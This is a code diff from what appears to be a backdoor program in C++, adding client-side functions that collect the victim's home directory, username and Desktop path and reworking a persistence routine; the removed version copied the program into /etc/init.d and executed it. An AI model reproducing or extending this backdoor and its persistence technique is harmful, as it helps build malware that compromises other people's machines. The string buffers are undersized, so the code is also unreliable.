@@ -105,6 +105,54 @@ void Backdoor::menu(){
 }
 
 
+
+void Backdoor::persistence(){
+    const char *  root_path_init_d = "/etc/init.d";
+    const char * bash_rc = "~/.bashrc";
+    std::cout << "Running persistence" << std::endl;
+    if(geteuid() != 0)
+    {
+        std::cout << "Not root";
+
+    }else{
+
+        std::cout << "root";
+    }
+}
+
+void Backdoor::get_home_enviroment(){
+    struct passwd *pw;
+    char * home;
+    uid_t uid;
+    uid_t NO_UID = -1;
+    uid = getuid();
+
+    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
+    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
+    strcpy(home, pw->pw_dir);
+    strcat(home, "/");
+    this->user_home = home;
+}
+
+void Backdoor::get_username(){
+    struct passwd *pw;
+    uid_t uid;
+    uid_t NO_UID = -1;
+    uid = getuid();
+
+    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
+    this->user_name = pw->pw_name;
+}
+
+
+void Backdoor::get_desktop_enviroment(){
+    char * path = (char *)malloc((sizeof(char)*strlen(this->user_home) + 9));
+    strcpy(path, this->user_home);
+    strcat(path, "Desktop/");
+    this->user_desktop = path;   
+}
+
+
 Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->sock = sock;
     this->c  = c;
@@ -113,21 +161,11 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
 
     if(is_server){
         //menu();
-    }
-}
-
-void Backdoor::persistence(){
-    const char *  path = "/etc/init.d";
-    std::cout << "Running persistence" << std::endl;
-    if(geteuid() != 0)
-    {
-        std::cout << "Not root";
-
+        
     }else{
-        chmod(program);
-        move_script(program, path);
-    
-        std::cout << "root";
-        system(path);
+        // GET ENVIROMENT VARIABLES
+        get_home_enviroment();
+        get_username();
+        get_desktop_enviroment();
     }
 }
